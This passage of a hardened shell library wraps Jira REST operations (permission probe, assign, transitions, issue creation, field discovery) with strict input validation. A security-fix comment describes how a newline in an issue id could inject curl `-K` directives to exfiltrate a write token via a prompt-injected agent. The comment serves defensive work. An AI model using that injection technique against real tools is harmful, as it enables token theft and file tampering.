  case "$_fe_flavour" in
    datacenter) _fe_url="$_fe_base$_fe_rb/search" ;;
    *)          _fe_url="$_fe_base$_fe_rb/search/jql" ;;
  esac
  _fe_clause=$(_tj_fe_clause "$_fe_spec")
  _fe_want=$(printf '%s\n' "$@" | jq -R -s -c 'split("\n") | map(select(length>0))' 2>/dev/null) \
    || { echo "unverified: could not build the requested id set" >&2; return 2; }
  _fe_buf=$(_tj_mktemp febuf) || { echo "unverified: could not create a scratch file" >&2; return 2; }
  _tj_fe_run_batches "$_fe_flavour" "$_fe_project" "$_fe_url" "$_fe_clause" "$_fe_buf" "$@" \
    || { _fe_rc=$?; rm -f "$_fe_buf"; return "$_fe_rc"; }
  _fe_objs=$(cat "$_fe_buf" 2>/dev/null) \
    || { echo "unverified: could not read the batched search results" >&2; rm -f "$_fe_buf"; return 2; }
  rm -f "$_fe_buf"
  _tj_fe_shape_ok "$_fe_objs" \
    || { echo "unverified: search response issue did not carry the expected key shape" >&2; return 2; }
  _tj_fe_subset_ok "$_fe_objs" "$_fe_want" || return $?
  # fix1 C1 (CLASS fix): the key extraction is captured FIRST, so a failing jq is caught here — not
  # hidden behind `sort`'s own rc, the third occurrence of this class (T2c list-in-states fix1 F1).
  _fe_keys=$(printf '%s' "$_fe_objs" | jq -r '.key' 2>/dev/null) \
    || { echo "unverified: could not extract the field-empty list keys" >&2; return 2; }
  printf '%s' "$_fe_keys" | LC_ALL=C sort 2>/dev/null \
    || { echo "unverified: could not sort the field-empty list" >&2; return 2; }
  return 0
}

# --- T5/S-11: mypermissions over-privilege probe — fails CLOSED (H-3) ---------------------------
# Prints exactly one of: over-privileged | ok | unverified (never defaults silently to ok).
tj_permissions() {
  _base=$1; _flavour=$2; _project=$3
  _tj_require_jq || { echo unverified; return 0; }
  # T3b step 0b (CLASS fix): same private run dir as above. T3b-0 fix1 Q4: this function's OWN
  # "prints exactly one of" contract must hold even when the WRAPPER's `mktemp -d` fails before
  # `_tj_perm_body` ever runs — that path exits 2 with empty stdout (its message goes to stderr),
  # which would otherwise violate the contract silently.
  _tp_rc=0
  _tp_out=$(_tj_rundir_run _tj_perm_body "$_base" "$_flavour" "$_project") || _tp_rc=$?
  if [ "$_tp_rc" -eq 2 ] && [ -z "$_tp_out" ]; then
    echo unverified
    return 2
  fi
  # T3b-core step 0b: a signal exit (130/143) never reached "prints exactly one of" — print
  # NOTHING, not a bare newline from an empty $_tp_out.
  case "$_tp_rc" in
    130|143) return "$_tp_rc" ;;
  esac
  printf '%s\n' "$_tp_out"
  return "$_tp_rc"
}

_tj_perm_body() {
  _base=$1; _flavour=$2; _project=$3
  _rb=$(_tj_rest_base "$_flavour")
  _perms="CREATE_ISSUES,EDIT_ISSUES,TRANSITION_ISSUES,ASSIGN_ISSUES,ADMINISTER_PROJECTS"
  if ! _body=$(jira_curl_authed GET "$_base$_rb/mypermissions?projectKey=$_project&permissions=$_perms" 2>/dev/null); then
    echo unverified
    return 0
  fi
  # H-3: an unparsable/error body must fail closed to unverified, never default to "ok".
  if ! printf '%s' "$_body" | jq -e '.permissions | type == "object"' >/dev/null 2>&1; then
    echo unverified
    return 0
  fi
  _over=$(printf '%s' "$_body" | jq -r '[.permissions[]? | select(.havePermission==true)] | length > 0' 2>/dev/null) || { echo unverified; return 0; }
  if [ "$_over" = "true" ]; then
    echo "over-privileged"
  else
    echo "ok"
  fi
  return 0
}

# --- TBG-BOARD-VERBS write functions (developer/agent token only — never the CI token, A5) ------
# All three route through the ONE hardened `jira_curl_authed` primitive (J2 — no second curl
# path); request bodies are built with `jq -n --arg` (S-8), never string-interpolated.
#
# SECURITY FIX ROUND (BLOCKER-1): the id<->project grammar (tj_get_issue's own S-4 check) is now
# a shared helper, `_tj_id_ok`, called FIRST in every write function — before ANY request,
# including the assign-self /myself lookup — because an unvalidated id was reaching
# `jira_curl_authed`'s URL and landing in the `-K` config's `url =` line unchecked. A newline (or
# other control byte) in an id could inject a SECOND `-K` directive (a spoofed `url =`,
# `trace-ascii =`, or `output =` line), which — since `board move` is guard-allowlisted as an
# ordinary write verb a prompt-injected agent can reach — meant a hostile issue id string could
# exfiltrate the developer's own write token or write an arbitrary local file. HIGH-1 (the S-4
# id<->project PIN) is discharged by the same helper: a cross-project id (`ZZ-9` under a pin of
# `AB`) is refused before any request, exactly as tj_get_issue already refused it on the read
# path. Defence in depth: `jira_curl_authed` (below) ALSO positively allowlists the whole URL
# before it reaches the `-K` config, so a hostile byte that somehow bypassed every id check still
# cannot inject a second `-K` directive.
#
# STATED CEILING (owed disclosure): a successful `assign-self` followed by a FAILED `transition`
# (board.sh's `claim`/`release` run these as one `--then` step) leaves the tracker's ASSIGNEE
# changed even though the git claim ref is compensated (deleted) — partial tracker state is not
# rolled back, only the ref is. This is a known, accepted gap, not silently absorbed.

# _tj_id_ok <project> <id>: the S-4 id<->project grammar, shared with tj_get_issue's own check.
# Called FIRST, before any request, on every write path (BLOCKER-1a/HIGH-1).
_tj_id_ok() {
  _tio_proj=$1; _tio_id=$2
  # T5bc fix1 B1(a) (security Medium): bound the id to <=32 chars (the same idiom as
  # _tj_lc_prefix_ok's own length bound) — 480 rows of unbounded keys can blow the seam's byte cap.
  [ "${#_tio_id}" -le 32 ] || return 1
  case "$_tio_id" in
    "$_tio_proj"-[0-9]*)
      _tio_rest=${_tio_id#"$_tio_proj"-}
      case "$_tio_rest" in
        ''|*[!0-9]*) return 1 ;;
      esac
      # T2c leg 1 (seam F-5): a leading-zero number (AB-07, AB-0) is refused HERE, shared by every
      # caller — moved out of `_tj_sa_validate_keys`'s own former local special case.
      case "$_tio_rest" in
        0*) return 1 ;;
      esac
      return 0 ;;
    *) return 1 ;;
  esac
}

# tj_assign_self <base> <flavour> <project> <id>: GET /myself for the caller's own accountId
# (Cloud) or username (DC), then PUT the issue's assignee. Fails closed on any unparsable myself
# response (never assigns to an empty/guessed identity). T3b-core step 0: the whole body runs
# inside `_tj_rundir_run` (like the read ops) so a signal mid-call cleans up every temp it makes,
# including its own PUT body file (now via `_tj_mktemp`, not a bare `mktemp`).
tj_assign_self() {
  _base=$1; _flavour=$2; _project=$3; _id=$4
  _tj_id_ok "$_project" "$_id" || { echo "refused: id does not match project (grammar)" >&2; return 1; }
  _tj_require_jq || return $?
  _tj_rundir_run _tj_as_body "$_base" "$_flavour" "$_project" "$_id"
}

_tj_as_body() {
  _base=$1; _flavour=$2; _project=$3; _id=$4
  _rb=$(_tj_rest_base "$_flavour")
  _me=$(jira_curl_authed GET "$_base$_rb/myself") || return $?
  case "$_flavour" in
    datacenter)
      _who=$(printf '%s' "$_me" | jq -r '.name // empty' 2>/dev/null || true)
      [ -n "$_who" ] || { echo "unverified: /myself carried no 'name' (datacenter)" >&2; return 2; }
      _bodyreq=$(jq -n --arg name "$_who" '{name: $name}') ;;
    *)
      _who=$(printf '%s' "$_me" | jq -r '.accountId // empty' 2>/dev/null || true)
      [ -n "$_who" ] || { echo "unverified: /myself carried no 'accountId' (cloud)" >&2; return 2; }
      _bodyreq=$(jq -n --arg accountId "$_who" '{accountId: $accountId}') ;;
  esac
  _bodyfile=$(_tj_mktemp asgnbody) || { echo "unverified: could not create a scratch file" >&2; return 2; }
  printf '%s' "$_bodyreq" > "$_bodyfile"
  # Reviewer Low #1: under `set -e`, `cmd; _rc=$?` never reaches the `rm -f` when cmd fails — the
  # `||` form (matching tj_create's existing shape) runs the cleanup on EITHER outcome.
  jira_curl_authed PUT "$_base$_rb/issue/$_id/assignee" "$_bodyfile" >/dev/null || { _rc=$?; rm -f "$_bodyfile"; return $_rc; }
  rm -f "$_bodyfile"
  return 0
}

# tj_transitions <base> <flavour> <project> <id>: GET the AVAILABLE transitions off the issue.
# Prints `<transition-id>\t<to.id>\t<to.name>` per line. T3b-core step 0: wrapped like the read ops.
tj_transitions() {
  _base=$1; _flavour=$2; _project=$3; _id=$4
  _tj_id_ok "$_project" "$_id" || { echo "refused: id does not match project (grammar)" >&2; return 1; }
  _tj_rundir_run _tj_trs_body "$_base" "$_flavour" "$_project" "$_id"
}

_tj_trs_body() {
  _base=$1; _flavour=$2; _project=$3; _id=$4
  _body=$(_tj_trs_fetch "$_base" "$_flavour" "$_id") || return $?
  _tj_trs_list "$_body"
}

# _tj_trs_fetch <base> <flavour> <id>: the raw transitions body. TRACKER-REQUIRED-FIELDS-DISCOVERY §15a:
# `expand=transitions.fields` also returns each transition's screen fields, read only to DIAGNOSE a refused POST.
_tj_trs_fetch() {
  _rb=$(_tj_rest_base "$2")
  jira_curl_authed GET "$1$_rb/issue/$3/transitions?expand=transitions.fields"
}

# _tj_trs_list <body>: `<transition-id>\t<to.id>\t<to.name>` per transition (the fields are not projected here).
_tj_trs_list() {
  printf '%s' "$1" | jq -r '.transitions[]? | [.id, .to.id, .to.name] | @tsv' 2>/dev/null
}

# _tj_tr_refused <raw-transitions-body> <transition-id> <state>: the ONE rc-5 sentence (design §15a) for a POST
# the tracker answered 400. Names the chosen transition's screen fields that are required and carry no default
# (id + name, each sok-gated: a non-conforming one prints as `?`); Jira's own response body is never surfaced (S-6).
_tj_tr_refused() {
  _trf_list=$(printf '%s' "$1" | jq -r --arg tid "$2" "$(_tj_cm_defs)"'
    [ .transitions[]? | select(.id == $tid) | (.fields | if type == "object" then . else {} end) | to_entries[]
      | select((.value | type) == "object" and .value.required == true and .value.hasDefaultValue != true)
      | ((.key | if fid_ok then . else "?" end) + " (" + (.value.name | if sok then . else "?" end) + ")") ]
    | join(", ")' 2>/dev/null || true)
  _trf_bad=$(printf '%s' "$1" | jq -r --arg tid "$2" '[ .transitions[]? | select(.id == $tid) | .fields | select(. != null and type != "object") ] | length' 2>/dev/null || echo 0)
  if [ "${_trf_bad:-0}" != 0 ]; then
    _trf_mid="its screen fields could not be read"
  elif [ -z "$_trf_list" ]; then
    _trf_mid="its screen reports no required field"
  else
    _trf_mid="its screen requires: $_trf_list"
  fi
  echo "refused: jira refused the transition to '$3'; $_trf_mid; a workflow validator may also require a field the screen does not report - the kit does not fill transition screens: set it in Jira, or give it a default in the workflow" >&2
}

# _tj_tr_post <url> <bodyfile> <raw-transitions-body> <transition-id> <state>: the transition POST. Always
# attempted. HTTP 400 -> rc 5 + the diagnosis above; every other outcome keeps the primitive's own rc and sentence.
_tj_tr_post() {
  _tp_stf=$(_tj_mktemp trst) || { echo "unverified: could not create a scratch file" >&2; return 2; }
  _tp_errf=$(_tj_mktemp trerr) || { rm -f "$_tp_stf"; echo "unverified: could not create a scratch file" >&2; return 2; }
  _TJ_STATUS_FILE=$_tp_stf
  _tp_rc=0
  jira_curl_authed POST "$1" "$2" >/dev/null 2>"$_tp_errf" || _tp_rc=$?
  unset _TJ_STATUS_FILE
  _tp_status=$(cat "$_tp_stf" 2>/dev/null || true)
  if [ "$_tp_rc" -eq 2 ] && [ "$_tp_status" = 400 ]; then
    rm -f "$_tp_stf" "$_tp_errf"
    _tj_tr_refused "$3" "$4" "$5"
    return 5
  fi
  # any other outcome: the primitive's own fixed sentence (held back above only so a 400 prints ONE line), same rc
  cat "$_tp_errf" >&2 2>/dev/null || true
  rm -f "$_tp_stf" "$_tp_errf"
  return "$_tp_rc"
}

# tj_transition <base> <flavour> <project> <id> <target-status-name>: resolves the ONE transition
# whose destination status NAME matches <target-status-name>, THEN executes it BY ITS to.id (S-8 —
# the transition actually posted is selected by that numeric to.id, never by re-matching the name a
# second time). Refuses (rc 1) if zero transitions match, or if more than one DISTINCT to.id matches
# the name (an ambiguous workflow — never guesses). T3b-core step 0: the resolve+execute body runs
# inside `_tj_rundir_run` (function-size ceiling extraction doubles as the wrap).
tj_transition() {
  _base=$1; _flavour=$2; _project=$3; _id=$4; _target=$5
  _tj_id_ok "$_project" "$_id" || { echo "refused: id does not match project (grammar)" >&2; return 1; }
  # LOW-1: the disallowed-byte set now ALSO covers newline/CR/other control bytes (the previous
  # filter caught only `"`, `\` and tab — a newline-bearing target was echoed verbatim into the
  # refusal sentences below, an injected-log-line shape demonstrated at fix round). A sanitised
  # display copy (printable ASCII only, truncated) is used in every echoed sentence from here on,
  # never the raw value, so even a byte this filter somehow missed cannot reach a terminal/log raw.
  _tab=$(printf '\t')
  case "$_target" in
    *'"'*|*'\'*|*"$_tab"*) echo "refused: target state name carries a disallowed byte" >&2; return 1 ;;
  esac
  _tj_target_clean=$(printf '%s' "$_target" | tr -d '[:cntrl:]')
  if [ "$_tj_target_clean" != "$_target" ]; then
    echo "refused: target state name carries a disallowed byte" >&2
    return 1
  fi
  # A sanitised, LENGTH-BOUNDED display copy for the echoed sentences below — never the raw value —
  # so even a control byte this filter somehow missed cannot land in a terminal/log verbatim (LOW-1).
  _tj_target_disp=$(printf '%s' "$_target" | cut -c1-40)
  _tj_require_jq || return $?
  _tj_rundir_run _tj_tr_body "$_base" "$_flavour" "$_project" "$_id" "$_target" "$_tj_target_disp"
}

_tj_tr_body() {
  _base=$1; _flavour=$2; _project=$3; _id=$4; _target=$5; _tj_target_disp=$6
  _trraw=$(_tj_trs_fetch "$_base" "$_flavour" "$_id") || return $?
  _list=$(_tj_trs_list "$_trraw")
  _tid=""; _toid=""; _n=0
  # nosemgrep: bash.lang.security.ifs-tampering.ifs-tampering
  _oldifs=$IFS; IFS='
'
  for _line in $_list; do
    IFS="$_oldifs"  # nosemgrep: bash.lang.security.ifs-tampering.ifs-tampering
    _lt=${_line#*	}; _lt=${_lt#*	}
    if [ "$_lt" = "$_target" ]; then
      _cur_toid=${_line#*	}; _cur_toid=${_cur_toid%%	*}
      if [ -z "$_toid" ]; then _toid=$_cur_toid; _tid=${_line%%	*}; _n=1
      elif [ "$_cur_toid" != "$_toid" ]; then _n=2; fi
    fi
    # nosemgrep: bash.lang.security.ifs-tampering.ifs-tampering
    IFS='
'
  done
  IFS=$_oldifs  # nosemgrep: bash.lang.security.ifs-tampering.ifs-tampering
  if [ "$_n" -eq 0 ]; then
    echo "refused: no available transition to status '$_tj_target_disp'" >&2
    return 1
  fi
  if [ "$_n" -gt 1 ]; then
    echo "refused: '$_tj_target_disp' is an AMBIGUOUS target (multiple distinct destination status ids) — refusing to guess" >&2
    return 1
  fi
  _rb=$(_tj_rest_base "$_flavour")
  _bodyreq=$(jq -n --arg tid "$_tid" '{transition: {id: $tid}}')
  _bodyfile=$(_tj_mktemp trbody) || { echo "unverified: could not create a scratch file" >&2; return 2; }
  printf '%s' "$_bodyreq" > "$_bodyfile"
  # Reviewer Low #1: same set -e/mktemp-leak fix as tj_assign_self above.
  _tj_tr_post "$_base$_rb/issue/$_id/transitions" "$_bodyfile" "$_trraw" "$_tid" "$_tj_target_disp" || { _rc=$?; rm -f "$_bodyfile"; return $_rc; }
  rm -f "$_bodyfile"
  return 0
}

# _tj_type_ok <name>: the `create.issuetype` grammar, the twin of tracker-conf.sh's own
# (`^[A-Za-z][A-Za-z0-9 _-]{0,39}$`) — a quote, backslash or control byte never reaches a request body.
# Spelled-out letter classes (the _tj_project_ok locale note): a range is not a byte range under macOS sh.
_tj_type_ok() {
  case "$1" in
    [ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz]*) : ;;
    *) return 1 ;;
  esac
  case "$1" in
    *[!ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789" "_-]*) return 1 ;;
  esac
  [ "${#1}" -le 40 ]
}

# _TJ_CREATE_KEYS: the closed set of NAMED create fragment keys (TRACKER-REQUIRED-FIELDS-DISCOVERY §15c) — the
# ONE definition. `tj_create`'s allow-list below and `writable-create-keys` (which `board.sh` asks) both read it;
# `customfield_N` (N = 1-10 digits) is the only pattern key. Anything else — assignee, reporter, security — is refused.
_TJ_CREATE_KEYS="priority components fixVersions duedate labels parent description"

# tj_writable_create_keys: prints the set above, one per line, `customfield_N` first. No network, no credential.
tj_writable_create_keys() {
  printf 'customfield_N\n'
  for _wk in $_TJ_CREATE_KEYS; do printf '%s\n' "$_wk"; done
}

# tj_create <base> <flavour> <project> <title> [<issuetype>] [<fields-json>]: POST a new issue. The
# type defaults to Task. <fields-json> is a JSON OBJECT of extra `.fields` the CALLER built with
# `jq -n --arg` (board.sh does — S-8: nothing here interpolates a string into a body). It is merged
# under `.fields` AFTER project/summary/issuetype, which it can never override. Prints the created
# `key` on success. T3b-core step 0: wrapped like the read ops.
tj_create() {
  _base=$1; _flavour=$2; _project=$3; _title=$4; _type=${5:-Task}; _frag=${6:-}
  [ -n "$_title" ] || { echo "refused: create requires --title" >&2; return 1; }
  # `-` reads the fragment from STDIN (bounded), so a large description never rides argv (E2BIG)
  # (read one byte past the bound: over it is REFUSED, never truncated into something that still parses)
  if [ "$_frag" = - ]; then
    _frag=$(head -c 262145)
    [ "$(printf '%s' "$_frag" | wc -c | tr -d ' ')" -le 262144 ] \
      || { echo "refused: the create fields fragment is over the 256 KiB bound" >&2; return 1; }
  fi
  [ -n "$_frag" ] || _frag='{}'
  _tj_status_id_ok "$_type" || _tj_type_ok "$_type" || { echo "refused: the issue type failed the type grammar" >&2; return 1; }
  _tj_require_jq || return $?
  # normalise ONCE, before every check: exactly one JSON document, and it an object. (`jq -e` judges only the
  # LAST output, so two documents `{"reporter":..}{}` used to pass both checks and the first was POSTed.)
  # Every later check, and the body builder, see only this single compact object.
  _frag=$(printf '%s' "$_frag" | jq -c -s 'if length == 1 and (.[0] | type) == "object" then .[0] else error("x") end' 2>/dev/null) \
    || { echo "refused: the create fields fragment is not exactly one JSON object" >&2; return 1; }
  # the KEY allowlist: only fields `board create` writes. Anything else (reporter, security, assignee,
  # project...) is refused before any request — a caller bug must never become a privileged write.
  # The set is `_TJ_CREATE_KEYS` + customfield_N — the SAME definition `writable-create-keys` prints.
  printf '%s' "$_frag" | jq -e --arg names "$_TJ_CREATE_KEYS" '($names | split(" ")) as $n
    | keys | all(. as $k | any($n[]; . == $k)
    or ($k | startswith("customfield_") and (.[12:] | explode | (length >= 1 and length <= 10 and all(. >= 48 and . <= 57)))))' >/dev/null 2>&1 \
    || { echo "refused: the create fields fragment carries a key outside the allowed set" >&2; return 1; }
  # L2: the system keys' VALUE shapes — priority {name|id}, components/fixVersions arrays of the same, duedate YYYY-MM-DD
  printf '%s' "$_frag" | jq -e 'def one: type == "object" and (keys | length) == 1 and (keys[0] | . == "name" or . == "id") and (.[keys[0]] | type) == "string";
    (if has("priority") then (.priority | one) else true end)
    and (if has("components") then (.components | type == "array" and all(one)) else true end)
    and (if has("fixVersions") then (.fixVersions | type == "array" and all(one)) else true end)
    and (if has("duedate") then (.duedate | type == "string" and length == 10 and test("^[0-9]{4}-[0-9]{2}-[0-9]{2}$")) else true end)' >/dev/null 2>&1 \
    || { echo "refused: the create fields fragment carries a malformed value for priority, components, fixVersions or duedate" >&2; return 1; }
  _tj_rundir_run _tj_cr_body "$_base" "$_flavour" "$_project" "$_title" "$_type" "$_frag"
}

_tj_cr_body() {
  _base=$1; _flavour=$2; _project=$3; _title=$4; _type=$5; _frag=$6
  _rb=$(_tj_rest_base "$_flavour")
  # a digits-only type is a numeric id ({id}, unambiguous), anything else a name ({name})
  _tykind=name; _tj_status_id_ok "$_type" && _tykind=id
  # the fragment (up to ~150 KB of ADF) goes to jq on STDIN as its input, never as an argv value (E2BIG)
  _bodyreq=$(printf '%s' "$_frag" | jq --arg proj "$_project" --arg summary "$_title" --arg ty "$_type" --arg tk "$_tykind" \
    '{fields: ({project: {key: $proj}, summary: $summary, issuetype: {($tk): $ty}} + (. | del(.project, .summary, .issuetype)))}')
  _bodyfile=$(_tj_mktemp crbody) || { echo "unverified: could not create a scratch file" >&2; return 2; }
  printf '%s' "$_bodyreq" > "$_bodyfile"
  _resp=$(jira_curl_authed POST "$_base$_rb/issue" "$_bodyfile") || { _rc=$?; rm -f "$_bodyfile"; return $_rc; }
  rm -f "$_bodyfile"
  _key=$(printf '%s' "$_resp" | jq -r '.key // empty' 2>/dev/null || true)
  case "$_key" in
    [A-Z0-9]*) : ;;
    *) echo "unverified: create response carried no valid 'key'" >&2; return 2 ;;
  esac
  case "$_key" in
    *[!A-Z0-9-]*) echo "unverified: create response 'key' failed grammar" >&2; return 2 ;;
  esac
  printf '%s\n' "$_key"
  return 0
}

# --- create-meta / get-fields (BOARD-CREATE-HONOURS-FIELD-MAP, design 2026-10-01 §3b) ----------------
# `create-meta` reads what a project's issue type will ACCEPT, so `board create` can refuse a field that
# is not on that type's screen BEFORE it POSTs; `get-fields` is its post-read. Both are GET-only, run
# through the one primitive. S-6 EXCEPTION, stated (design 2026-10-01 §3c): field names and allowed values
# DO reach the terminal (board.sh lists them in its refusals), but only after the `sok` projection bounds
# each to printable ASCII, 1..80 bytes, no tab/pipe — a non-conforming name prints as `?` and a
# non-conforming allowed value is dropped. fieldId / type-id grammar, the response shape and a short page
# stay fail-closed with a fixed sentence naming the SHAPE, never the content.

# _tj_cm_defs: the jq definitions both projections share. `sok` = a printable, tab-free, pipe-free,
# 1..80-byte string (the pipe is the allowed-value join byte; the tab is the column byte). Checked on
# CODEPOINTS (explode), never by a regex whose `$` would also match before a trailing newline.
_tj_cm_defs() {
  printf '%s' 'def sok: type == "string" and length >= 1 and length <= 80 and (explode | all(. >= 32 and . <= 126 and . != 124));
def digs: explode | (length >= 1 and length <= 10 and all(. >= 48 and . <= 57));
def short($a): if ((.total | type) == "number" and .total > ($a | length)) or .isLast == false then error("KIT-SHORT") else . end;
def fid_ok: type == "string" and ((startswith("customfield_") and (.[12:] | digs))
  or (explode as $c | ($c | length) >= 1 and ($c | length) <= 64 and ($c[0] | . >= 97 and . <= 122)
      and ($c | all(. == 95 or (. >= 48 and . <= 57) or (. >= 65 and . <= 90) or (. >= 97 and . <= 122)))));
'
}

# _tj_cm_fail <errfile>: the ONE place a create-meta/get-fields projection failure becomes a sentence.
_tj_cm_fail() {
  if grep -q 'KIT-SHORT' "$1" 2>/dev/null; then
    echo "unverified: create-meta page is incomplete (it reports more fields than it returned)" >&2
  elif grep -q 'KIT-CHARSET' "$1" 2>/dev/null; then
    echo "unverified: create-meta response carried a value outside the allowed charset" >&2
  else
    echo "unverified: create-meta response failed the expected shape" >&2
  fi
}

# _tj_cm_types <body> <wanted-type-or-empty>: prints `<id>\t<name>` per NON-subtask type (only <wanted>
# when given). Cloud's list is `.issueTypes`, Data Center's is `.values`.
_tj_cm_types() {
  _ct_err=$(_tj_mktemp cmerr) || { echo "unverified: could not create a scratch file" >&2; return 2; }
  printf '%s' "$1" | jq -r --arg want "$2" "$(_tj_cm_defs)"'
    (.issueTypes // .values) as $a
    | if ($a | type) != "array" then error("KIT-SHAPE") else . end
    | short($a)
    | $a[]
    | if type != "object" then error("KIT-SHAPE") else . end
    | select(.subtask != true)
    | if ((.id | type) == "string") and (.id | digs) and (.name | sok) then . else error("KIT-CHARSET") end
    | select($want == "" or .name == $want)
    | [.id, .name] | join("\t")' 2>"$_ct_err" \
    || { _tj_cm_fail "$_ct_err"; rm -f "$_ct_err"; return 2; }
  rm -f "$_ct_err"
}

# _tj_cm_fields <body> <type-name>: prints one `<type>\t<fieldId>\t<schema.type>\t<name>\t<values>` per
# field the kit can write (customfield_N, labels, parent, description) — nothing else is projected.
_tj_cm_fields() {
  _cf_err=$(_tj_mktemp cmerr) || { echo "unverified: could not create a scratch file" >&2; return 2; }
  printf '%s' "$1" | jq -r --arg ty "$2" "$(_tj_cm_defs)"'
    def writable: (.fieldId | type) == "string"
      and ((.fieldId | IN("labels", "parent", "description"))
           or ((.fieldId | startswith("customfield_")) and (.fieldId[12:] | digs)));
    def nm: if sok then . else "?" end;
    def vals: (.allowedValues // []) as $v
      | if ($v | type) != "array" then error("KIT-SHAPE") else . end
      | [$v[] | if type != "object" then error("KIT-SHAPE") else (.value // empty) end]
      | map(select(sok)) | .[:100] | join("|");
    (.fields // .values) as $a
    | if ($a | type) != "array" then error("KIT-SHAPE") else . end
    | short($a)
    | $a[]
    | if type != "object" then error("KIT-SHAPE") else . end
    | select(writable)
    | if (.schema | type) != "object" then error("KIT-SHAPE") else . end
    | [$ty, .fieldId, (.schema.type | nm), (.name | nm), vals] | join("\t")' 2>"$_cf_err" \
    || { _tj_cm_fail "$_cf_err"; rm -f "$_cf_err"; return 2; }
  rm -f "$_cf_err"
}

# tj_create_meta <base> <flavour> <project> [<issuetype>]: prints the writable fields of <issuetype>
# (or of EVERY non-subtask type). rc 1 + a fixed sentence when the named type is not in the project;
# rc 2 (unverified) on any shape/charset/pagination fault. GET-only.
tj_create_meta() {
  [ $# -ge 3 ] && [ $# -le 4 ] || { echo "refused: create-meta requires <base> <flavour> <project> [<issuetype>]" >&2; return 1; }
  _base=$1; _flavour=$2; _project=$3; _type=${4:-}
  _tj_project_ok "$_project" || { echo "refused: project failed the project grammar" >&2; return 1; }
  [ -z "$_type" ] || _tj_type_ok "$_type" || { echo "refused: the issue type failed the type grammar" >&2; return 1; }
  _tj_require_jq || return $?
  _tj_rundir_run _tj_cm_body "$_base" "$_flavour" "$_project" "$_type"
}

_tj_cm_body() {
  _base=$1; _flavour=$2; _project=$3; _type=$4
  _cm_proj=${5:-_tj_cm_fields}   # the per-type projection; `required-fields` passes its own (only ever a function of this file)
  _cm_root="$_base$(_tj_rest_base "$_flavour")/issue/createmeta/$_project/issuetypes"
  # rc contract: 3 = the named type is not in the project, 4 = the name is ambiguous, 2 = unverified (ANY
  # transport/credential/URL refusal from the primitive is mapped here, never to 1/3), 1 = bad arguments.
  _cm_tbody=$(jira_curl_authed GET "$_cm_root?maxResults=100") || return 2
  _cm_list=$(_tj_cm_types "$_cm_tbody" "$_type") || return $?
  if [ -z "$_cm_list" ]; then
    echo "refused: the issue type is not in this project's create-meta" >&2
    return 3
  fi
  if [ -n "$_type" ] && [ "$(printf '%s\n' "$_cm_list" | wc -l | tr -d ' ')" -gt 1 ]; then
    echo "refused: the issue type name is ambiguous in this project (more than one type carries it)" >&2
    return 4
  fi
  _cm_all=""
  while IFS="	" read -r _cm_id _cm_name; do
    _cm_fbody=$(jira_curl_authed GET "$_cm_root/$_cm_id?maxResults=100") || return 2
    _cm_lines=$("$_cm_proj" "$_cm_fbody" "$_cm_name") || return $?
    # a NAMED type also yields its numeric id, so the caller can create by id (never by an ambiguous name)
    [ -z "$_type" ] || _cm_all="#type-id	${_cm_id}
"
    [ -z "$_cm_lines" ] || _cm_all="${_cm_all}${_cm_lines}
"
  done <<EOF_CM
$_cm_list
EOF_CM
  printf '%s' "$_cm_all"
}

# --- required-fields (TRACKER-REQUIRED-FIELDS-DISCOVERY, design 2026-10-03 §3, §15b) ---------------------
# `required-fields` reads which fields a project's issue type REQUIRES (and Jira does not default), so
# `board create` can cover or refuse each BEFORE it POSTs. It rides create-meta's fetch (`_tj_cm_body`) with its own
# projection; `create-meta`'s output is untouched. Same S-6 EXCEPTION as create-meta: field names and allowed values
# reach the terminal only after the `sok` projection (printable ASCII, 1..80 bytes, no tab/pipe).

# _tj_rf_defs: the jq definitions the projection adds — `kind` maps `.schema` to the closed kind set (first match wins).
_tj_rf_defs() {
  printf '%s' 'def kind: (.schema | if type == "object" then . else {} end) as $s | ($s.custom // "") as $c
  | if $s.type == "string" then (if ($c | type) == "string" and ($c | endswith(":textarea")) then "text" else "string" end)
    elif $s.type == "number" then "number"
    elif $s.type == "date" then "date"
    elif $s.type == "option" then "option"
    elif $s.type == "array" and $s.items == "option" then "option-array"
    elif $s.type == "array" and $s.items == "string" then "string-array"
    elif $s.type == "priority" then "priority"
    elif $s.type == "array" and $s.items == "component" then "component-array"
    elif $s.type == "array" and $s.items == "version" then "version-array"
    elif $s.type == "user" then "user"
    elif $s.type == "team" then "team"
    else "unsupported" end;
def nm: if sok then . else "?" end;
def allowed: (.allowedValues // []) as $v
  | if ($v | type) != "array" then error("KIT-SHAPE") else . end
  | [$v[] | if type != "object" then error("KIT-SHAPE") else (.value // .name // null) end] as $raw
  | ($raw | map(select(sok))) as $kept
  | {s: ($kept | .[:100] | join("|")), t: (($kept | length) != ($raw | length) or ($kept | length) > 100)};
'
}

# _tj_rf_fields <body> <type-name>: one `<fieldId>\t<kind>\t<name>\t<allowed>\t<completeness>` per field that is
# `.required == true` (a boolean — any other JSON type is a shape fault), has no `hasDefaultValue: true`, and is not
# one the server fills (project, issuetype, summary, reporter). A fieldId outside the grammar is DROPPED, never
# printed, and marks the whole result `truncated`; so does an allowed value `sok` dropped or a list over 100.
_tj_rf_fields() {
  _rf_err=$(_tj_mktemp cmerr) || { echo "unverified: could not create a scratch file" >&2; return 2; }
  printf '%s' "$1" | jq -r "$(_tj_cm_defs)$(_tj_rf_defs)"'
    (.fields // .values) as $a
    | if ($a | type) != "array" then error("KIT-SHAPE") else . end
    | short($a)
    | [$a[] | if type != "object" then error("KIT-SHAPE") else . end
        | if (.required | type) != "boolean" then error("KIT-SHAPE") else . end
        | select(.required == true and .hasDefaultValue != true)
        | select((.fieldId | IN("project", "issuetype", "summary", "reporter")) | not)] as $req
    | ($req | map(select(.fieldId | fid_ok))) as $good
    | (($req | length) != ($good | length)) as $dropped
    | (($req | length) - ($good | length)) as $nd
    | (if $nd > 0 then "#dropped\t" + ($nd | tostring) else empty end),
      ($good[] | allowed as $al
       | [.fieldId, kind, (.name | nm), $al.s, (if $dropped or $al.t then "truncated" else "complete" end)] | join("\t"))' 2>"$_rf_err" \
    || { _tj_cm_fail "$_rf_err"; rm -f "$_rf_err"; return 2; }
  rm -f "$_rf_err"
}

# tj_required_fields <base> <flavour> <project> <issuetype>: `#type-id` then the required fields. Same rc contract
# as create-meta (3 = type absent, 4 = ambiguous, 2 = unverified); the type is MANDATORY here. GET-only.
tj_required_fields() {
  [ $# -eq 4 ] || { echo "refused: required-fields requires <base> <flavour> <project> <issuetype>" >&2; return 1; }
